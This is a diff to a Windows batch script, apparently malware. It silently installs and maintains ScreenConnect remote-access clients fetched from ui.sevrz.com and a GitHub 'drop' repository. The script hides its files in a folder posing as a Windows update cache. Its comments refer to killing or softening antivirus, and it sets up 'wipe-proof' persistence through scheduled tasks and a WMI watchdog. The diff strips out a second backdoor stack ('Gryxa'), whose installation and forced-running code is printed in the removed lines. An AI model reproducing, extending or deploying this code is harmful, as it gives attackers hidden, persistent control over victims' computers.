@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260804O53 - MSI OLE magic; soft AV (no Sense kill / no WinDefend disable)
+REM OWN BUILD 20260804O54 - sevrz-only deploy (Gryxa stack removed)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -8,14 +8,9 @@ set "MSI=%TEMP%\sc_primary.msi"
 set "MSICACHE=%WD%\pkg.msi"
 set "PRIM=ScreenConnect Client (5f6010579852e507)"
 set "ALT=ScreenConnect Client (f861c8140d453427)"
-set "GRYXA=ScreenConnect Client (36e506ff016b2151)"
 set "KEEP1=5f6010579852e507"
 set "KEEP2=f861c8140d453427"
-set "KEEP3=36e506ff016b2151"
 set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-set "MSI_G=%TEMP%\sc_gryxa.msi"
-set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 set "SELF=%WD%\own_run.cmd"
 set "PF86=%ProgramFiles(x86)%"
 set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
@@ -269,60 +264,6 @@ echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may
 REM L45/M48 HANDS-OFF: never msiexec any ScreenConnect — diagnose disconnects first
 echo hands_off_skip_primary_msi>>"%LOG%"
 goto :after_primary_install
-REM O53/L44: refuse sevrz /i when ANY Gryxa/non-sevrz SC present OR ExpectedFp svc exists.
-REM ImagePath often lacks gryxa.com — also gate on ExpectedFp + protect-msi before /i.
-set "GPRESENT=0"
-sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
-if not errorlevel 1 set "GPRESENT=1"
-for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-  set "_FP=%%a"
-  set "_FP=!_FP: =!"
-  if /I not "!_FP!"=="%KEEP1%" if /I not "!_FP!"=="%KEEP2%" (
-    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-    if not errorlevel 1 set "GPRESENT=1"
-  )
-  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
-    echo %%I | findstr /I "gryxa.com" >nul && set "GPRESENT=1"
-  )
-)
-if "!GPRESENT!"=="1" (
-  echo primary_skip_i_protect_gryxa>>"%LOG%"
-  goto :after_primary_install
-)
-echo primary_install_begin>>"%LOG%"
-set "MSI_SAFE="
-if exist "%WD%\own_lib.ps1" (
-  for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -WorkDir "%WD%" -Extra "%MSI%" 2^>nul`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
-)
-if not defined MSI_SAFE (
-  echo primary_protect_fail_skip_i>>"%LOG%"
-  goto :after_primary_install
-)
-msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
-set "INST_EXIT=!ERRORLEVEL!"
-echo msi_exit_!INST_EXIT!>>"%LOG%"
-if "!INST_EXIT!"=="1618" (
-  echo msi_busy_retry1>>"%LOG%"
-  timeout /t 30 /nobreak >nul
-  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
-  set "INST_EXIT=!ERRORLEVEL!"
-  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
-)
-if "!INST_EXIT!"=="1618" (
-  echo msi_busy_retry2>>"%LOG%"
-  timeout /t 45 /nobreak >nul
-  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
-  set "INST_EXIT=!ERRORLEVEL!"
-  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
-)
-timeout /t 15 /nobreak >nul
-
-REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
-sc query "%PRIM%" >nul 2>&1
-if errorlevel 1 (
-  echo postinstall_svc_missing_repair>>"%LOG%"
-  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
-)
 
 :after_primary_install
 sc config "%PRIM%" start= auto >nul 2>&1
@@ -350,22 +291,6 @@ if errorlevel 1 if exist "%WD%\own_lib.ps1" (
   echo alt_missing_repair>>"%LOG%"
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
 )
-
-echo [5b] Gryxa FREEZE start-only (no msiexec - manual own_gryxa_force for install)...
-if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
-if exist "%WD%\own_lib.ps1" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O43 >>"%LOG%" 2>&1
-) else (
-  sc config "%GRYXA%" start= auto >nul 2>&1
-  sc start "%GRYXA%" >nul 2>&1
-)
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
-if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
-sc config "%GRYXA%" start= auto >nul 2>&1
-sc start "%GRYXA%" >nul 2>&1
-timeout /t 5 /nobreak >nul
-sc query "%GRYXA%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_freeze_no_install>>"%LOG%")
 
 echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
 echo persist_begin>>"%LOG%"
@@ -540,17 +465,6 @@ if exist "%WD%\own_lib.ps1" (
 echo exterminate_done>>"%LOG%"
 REM settle Windows Installer mutex after /x before any /i or /fa
 timeout /t 8 /nobreak >nul
-exit /b 0
-
-:EnsureGryxaMust
-rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
-if exist "%WD%\own_lib.ps1" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
-)
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
-if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
-sc query "%GRYXA%" | findstr /I RUNNING >nul
-if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
 exit /b 0
 
 :NoMsiPolicy
